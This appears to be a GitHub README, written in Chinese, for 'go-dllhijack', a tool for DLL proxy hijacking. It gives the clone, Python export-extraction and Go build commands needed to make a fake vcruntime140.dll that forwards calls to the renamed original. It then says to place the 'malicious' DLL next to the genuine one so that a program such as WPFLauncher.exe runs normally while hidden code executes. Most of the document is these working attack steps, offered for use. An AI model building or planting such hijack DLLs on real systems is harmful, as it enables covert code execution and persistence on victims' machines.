# go-dllhijack
##基于go的简单劫持方法
在使用前请确保你系统上有GoLang python MinGW

以vcruntime140.dll为例
```sh
git clone https://github.com/famei/go-dllhijack
pip install pefile
python def.py vcruntime140.dll
```
会得到以下输出
![](https://raw.githubusercontent.com/famei/go-dllhijack/main/def.png)
###将输出的内容复制到win.def内
###新建一个bat脚本
```bat
dlltool --output-exp win.exp --input-def win.def
set GOOS=windows
set GOARCH=386
set CGO_ENABLED=1
go build -buildmode=c-shared -o vcruntime140.dll -ldflags="-extldflags=-Wl,{文件夹绝对路径}\win.exp -s -w"
```
###会得到一个vcruntime140.dll文件
将正常的vcruntime140.dll重命名为_vcruntime140.dll
将恶意的vcruntime140.dll和_vcruntime140.dl放在同一目录

这里用WPFLauncher.exe作为演示
双击WPFLauncher.exe程序正常运行 恶意代码被成功执行
![](https://raw.githubusercontent.com/famei/go-dllhijack/main/WPFLauncher.png)


